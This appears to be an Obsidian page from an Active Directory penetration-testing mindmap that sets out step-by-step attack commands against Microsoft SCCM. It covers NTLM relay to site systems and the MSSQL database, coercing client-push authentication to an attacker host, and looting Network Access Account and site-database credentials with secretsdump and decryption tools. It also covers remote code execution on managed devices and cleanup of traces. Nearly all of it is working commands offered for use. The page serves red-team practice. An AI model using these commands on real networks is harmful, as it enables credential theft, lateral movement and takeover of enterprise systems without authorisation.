---
title: "SCCM"
category: sccm
color: "#ebfbee"
tags:
  - ad-mindmap
  - sccm
---

# 🗄️ SCCM

> [!info] Mindmap box `SCCM`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## recon

- `sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug` [↗](https://github.com/garrettfoster13/sccmhunter)
    - `sccmhunter.py show -all` [↗](https://github.com/garrettfoster13/sccmhunter)
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm` [↗](https://github.com/franc-pentest/ldeep)
- `nxc smb <sccm_server> -u <user> -p <password> -d <domain> --shares` [↗](https://github.com/Pennyw0rth/NetExec)

## Creds-1 No credentials
➡️ [[Valid Credentials|NAA credentials]] / [[Valid Credentials|User + Pass]]

- Extract from pxe See no creds ➡️ [[No Credentials|PXE]]

## Elevate-1:Relay on site systems Simple user
➡️ [[Admin Access|Admin on Site system]]

- coerce sccm site server
    - `ntlmrelayx.py -tf <site_systems> -smb2support` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)

## Elevate-2:Force client push Simple user
➡️ [[Admin Access|Admin]]

- `ntlmrelayx.py -t <sccm_server> -smb2support -socks # listen connection` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
    - `SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip> # Launch client push install` [↗](https://github.com/Mayyhem/SharpSCCM)
        - `proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>` [↗](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)
            - cleanup

## Elevate-3:Automatic client push Simple user
➡️ [[Man In The Middle|Relay ntlm]]

- Create DNS A record for non existing computer x
    - `dnstool.py -u '<domain>\<user>' -p <pass>  -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>` [↗](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)
        - Enroll new computer x in AD  then remove host SPN from the machine account
            - `setspn -D host/<newcomputer> <newcomputer> setspn -D host/<newcomputer>.<domain> <newcomputer>`
                - wait 5m for client push
                    - `ntlmrelayx.py -tf <no_signing_target> -smb2support -socks` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
                        - cleanup

## CRED-6 Loot creds
➡️ [[Valid Credentials|User + Pass]]

- SCCM SMB service (445/TCP) on a DP
    - `cmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txt` [↗](https://github.com/shelltrail/cmloot/tree/main)
- SCCM HTTP service (80/TCP or 443/TCP) on a DP
    - `SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>'` [↗](https://github.com/synacktiv/SCCMSecrets)
    - `SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>'` [↗](https://github.com/synacktiv/SCCMSecrets)
    - `sccm-http-looter -server <ip_dp>` [↗](https://github.com/badsectorlabs/sccm-http-looter)

## Takeover-1:relay to mssql db Simple user
➡️ [[SCCM|SCCM ADMIN]]

- SCCM MSSQL != SSCM server
    - `sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked` [↗](https://github.com/garrettfoster13/sccmhunter)
        - `ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q "<query>"` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
            - coerce sccm_mssql -> attacker
                - `sccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>` [↗](https://github.com/garrettfoster13/sccmhunter)

## Takeover-2:relay to mssql server Simple user
➡️ [[Admin Access|Admin MSSQL]]

- SCCM MSSQL != SSCM server
    - `ntlmrelayx.py -t <sccm_mssql> -smb2support -socks` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
        - coerce sccm_server
            - `proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)

## Creds-2:Policy Request Credentials Simple user
➡️ [[Valid Credentials|User + Pass]]

- add computer
    - `sccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\<computer_added>$' '<computer_pass>'` [↗](https://github.com/xpn/sccmwtf/tree/main)
        - get NetworkAccessUsername and NetworkAccessPassword
            - `policysecretunobfuscate.py` [↗](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.py)
                - delete device created after sccmadmin
    - `SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>"` [↗](https://github.com/Mayyhem/SharpSCCM)
        - cleanup

## Creds-3Creds-4 Computer Admin user
➡️ [[Valid Credentials|NAA credentials]]

- `dploot.py sccm -u <admin> -p '<password>' <sccm_target>` [↗](https://github.com/zblurx/dploot)
- `sccmhunter.py dpapi  -u <admin> -p '<password>' -target <sccm_target> -debug` [↗](https://github.com/garrettfoster13/sccmhunter)
- `SharpSCCM.exe local secrets -m disk` [↗](https://github.com/Mayyhem/SharpSCCM)
- `SharpSCCM.exe local secrets -m wmi` [↗](https://github.com/Mayyhem/SharpSCCM)

## Creds-5 SCCM admin
➡️ [[Valid Credentials|Site DB credentials]]

- `secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
    - `mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>' '<domain>/<sccm_target>$'@<sccm_mssql>` [↗](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
        - `use CM_<site_code>;`
            - `SELECT * FROM SC_UserAccount;`
                - `sccmdecryptpoc.exe <cyphered_value>`

## EXEC-1/2 SCCM admin
➡️ [[Lateral Movement|lat]]

- `SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner` [↗](https://github.com/Mayyhem/SharpSCCM)
- `sccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>` [↗](https://github.com/garrettfoster13/sccmhunter)
    - `get_device <hostname>`
        - `interact <device_id>`
            - `script xploit.ps1`

## Cleanup

- `SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p "Name" -p "ResourceId" -p "SMSUniqueIdentifier"` [↗](https://github.com/Mayyhem/SharpSCCM)
    - `SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>` [↗](https://github.com/Mayyhem/SharpSCCM)

## Post exploit

- as sccm admin
    - `SCCMHound.exe --server <server> --sitecode <sitecode>` [↗](https://github.com/CrowdStrike/sccmhound) ➡️ [[Lateral Movement|Users sessions]]
